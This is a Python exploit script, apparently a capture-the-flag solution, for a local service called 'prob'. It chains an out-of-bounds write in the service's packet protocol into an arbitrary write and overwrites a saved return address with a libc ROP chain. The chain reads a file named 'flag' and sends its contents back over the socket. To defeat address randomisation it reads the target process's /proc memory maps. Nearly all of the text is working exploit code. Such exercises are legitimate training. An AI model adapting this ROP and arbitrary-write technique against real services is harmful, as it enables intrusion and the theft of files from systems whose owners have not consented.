#!/usr/bin/env python3
import argparse
import os
import re
import socket
import struct
import subprocess
import sys
import time


def p64(x: int) -> bytes:
    return struct.pack('<Q', x)


def p32be(x: int) -> bytes:
    return struct.pack('>I', x)


def pkt(op: int, payload: bytes = b'') -> bytes:
    hdr = bytearray(16)
    hdr[0] = 0x80
    hdr[1] = op
    hdr[8:12] = p32be(len(payload))
    return bytes(hdr) + payload


def recvn(sock: socket.socket, n: int) -> bytes:
    out = b''
    while len(out) < n:
        chunk = sock.recv(n - len(out))
        if not chunk:
            break
        out += chunk
    return out


def sendpkt(sock: socket.socket, op: int, payload: bytes = b'') -> bytes:
    sock.sendall(pkt(op, payload))
    hdr = recvn(sock, 16)
    if len(hdr) != 16:
        raise EOFError(f'short response header: {hdr!r}')
    length = struct.unpack('>I', hdr[8:12])[0]
    body = recvn(sock, length)
    if len(body) != length:
        raise EOFError(f'short response body: expected {length}, got {len(body)}')
    return hdr + body


def set_offset(sock: socket.socket, offset: int) -> None:
    sendpkt(sock, 2, p32be(offset))


# Bug chain:
# - opcode 4 writes to state+0x20+offset with only len<=0x20
# - choose offset=0x20 to overwrite state->buf at +0x40
# - opcode 3 then becomes an arbitrary write to state->buf+offset

def arb_write(sock: socket.socket, target_addr: int, data: bytes) -> None:
    set_offset(sock, 0x20)
    sendpkt(sock, 4, p64(target_addr - 0x20))
    sendpkt(sock, 3, data)


def read_text(path: str) -> str:
    try:
        with open(path, 'r', encoding='utf-8', errors='replace') as f:
            return f.read()
    except OSError:
        return ''


def proc_comm(pid: int) -> str:
    return read_text(f'/proc/{pid}/comm').strip()


def proc_cmdline(pid: int) -> str:
    try:
        raw = open(f'/proc/{pid}/cmdline', 'rb').read()
    except OSError:
        return ''
    return raw.replace(b'\0', b' ').decode(errors='replace').strip()


def proc_state(pid: int) -> str:
    stat = read_text(f'/proc/{pid}/stat')
    if not stat:
        return '?'
    try:
        return stat.rsplit(')', 1)[1].strip().split()[0]
    except Exception:
        return '?'


def find_listener_pid() -> int:
    candidates = []
    for name in os.listdir('/proc'):
        if not name.isdigit():
            continue
        pid = int(name)
        if proc_comm(pid) != 'prob':
            continue
        if proc_state(pid) == 'Z':
            continue
        cmd = proc_cmdline(pid)
        if 'prob' not in cmd:
            continue
        candidates.append((pid, cmd))
    if not candidates:
        raise SystemExit('[-] no live ./prob listener found; start it first with ./prob')
    candidates.sort()
    pid, cmd = candidates[0]
    print(f'[+] listener pid: {pid} ({cmd})', file=sys.stderr)
    return pid


def parse_maps(pid: int):
    maps_path = f'/proc/{pid}/maps'
    with open(maps_path, 'r', encoding='utf-8') as f:
        maps = f.read().splitlines()

    libc_base = None
    mmap_base = None
    stack_end = None

    for i, line in enumerate(maps):
        parts = line.split()
        if len(parts) < 5:
            continue
        start_s, end_s = parts[0].split('-')
        start, end = int(start_s, 16), int(end_s, 16)
        perms = parts[1]
        offset = parts[2]
        path = parts[-1] if len(parts) >= 6 else ''

        if '[stack]' in line:
            stack_end = end

        if ('libc.so' in path or '/libc-' in path) and perms.startswith('r--p') and offset == '00000000':
            libc_base = start
            if i > 0:
                prev = maps[i - 1].split()
                prev_path = prev[-1] if len(prev) >= 6 else ''
                prev_start = int(prev[0].split('-')[0], 16)
                # The 1MB RW mmap buffer is the anonymous region right before libc.
                if prev[1].startswith('rw-p') and prev_path == '':
                    mmap_base = prev_start

    if libc_base is None or mmap_base is None or stack_end is None:
        preview = '\n'.join(maps[:20])
        raise RuntimeError(
            'failed to extract libc_base, mmap_base, and stack_end from maps. '\
            f'pid={pid} comm={proc_comm(pid)!r} state={proc_state(pid)!r} cmd={proc_cmdline(pid)!r}\n{preview}'
        )

    return libc_base, mmap_base, stack_end


def get_sym(libc_path: str, name: str) -> int:
    out = subprocess.check_output(['readelf', '-sW', libc_path], text=True)
    pat = re.compile(r'\s+\d+:\s+([0-9a-f]+)\s+\d+\s+FUNC\s+\w+\s+\w+\s+\w+\s+' + re.escape(name) + r'(?:@@|@|$)')
    for line in out.splitlines():
        m = pat.match(line)
        if m:
            return int(m.group(1), 16)
    raise RuntimeError(f'missing symbol in libc: {name}')


def main() -> None:
    ap = argparse.ArgumentParser(description='Exploit the cage/prob service locally.')
    ap.add_argument('host', nargs='?', default='127.0.0.1')
    ap.add_argument('port', nargs='?', type=int, default=5000)
    ap.add_argument('--pid', type=int, help='listener pid; auto-detected if omitted')
    ap.add_argument('--libc', default='/usr/lib/x86_64-linux-gnu/libc.so.6')
    ap.add_argument('--libc-base', type=lambda x: int(x, 0))
    ap.add_argument('--mmap-base', type=lambda x: int(x, 0))
    ap.add_argument('--saved-rip', type=lambda x: int(x, 0))
    args = ap.parse_args()

    libc_base = args.libc_base
    mmap_base = args.mmap_base
    saved_rip = args.saved_rip

    if libc_base is None or mmap_base is None or saved_rip is None:
        pid = args.pid if args.pid is not None else find_listener_pid()
        libc_base, mmap_base, stack_end = parse_maps(pid)
        # For the provided service, the saved RIP inside the per-connection child
        # sits at a constant offset from the inherited stack mapping end.
        saved_rip = stack_end - 0x2f48

    print(f'[+] libc_base = {libc_base:#x}', file=sys.stderr)
    print(f'[+] mmap_base = {mmap_base:#x}', file=sys.stderr)
    print(f'[+] saved_rip = {saved_rip:#x}', file=sys.stderr)

    pop_rdi = libc_base + 0x2a145
    pop_rsi = libc_base + 0x2baa9
    pop_rdx = libc_base + 0xb4baa
    ret = libc_base + 0x2846b

    open_ = libc_base + get_sym(args.libc, 'open')
    read_ = libc_base + get_sym(args.libc, 'read')
    write_ = libc_base + get_sym(args.libc, 'write')
    exit_ = libc_base + get_sym(args.libc, 'exit')

    filename_addr = mmap_base + 0x100
    io_buf = mmap_base + 0x300

    sock = socket.create_connection((args.host, args.port), timeout=3)

    # Store the filename in the service's RW mmap.
    set_offset(sock, 0x100)
    sendpkt(sock, 3, b'flag\x00')

    # In the child process, the listening socket is closed, so open("flag") returns fd 3.
    # The accepted client socket remains fd 4.
    rop = b''.join(map(p64, [
        ret,
        pop_rdi, filename_addr,
        pop_rsi, 0,
        open_,
        pop_rdi, 3,
        pop_rsi, io_buf,
        pop_rdx, 0x100,
        read_,
        pop_rdi, 4,
        pop_rsi, io_buf,
        pop_rdx, 0x100,
        write_,
        pop_rdi, 0,
        exit_,
    ]))

    arb_write(sock, saved_rip, rop)
    time.sleep(0.1)
    data = sock.recv(4096)
    print(data.split(b'\x00')[0].decode(errors='replace'))


if __name__ == '__main__':
    main()
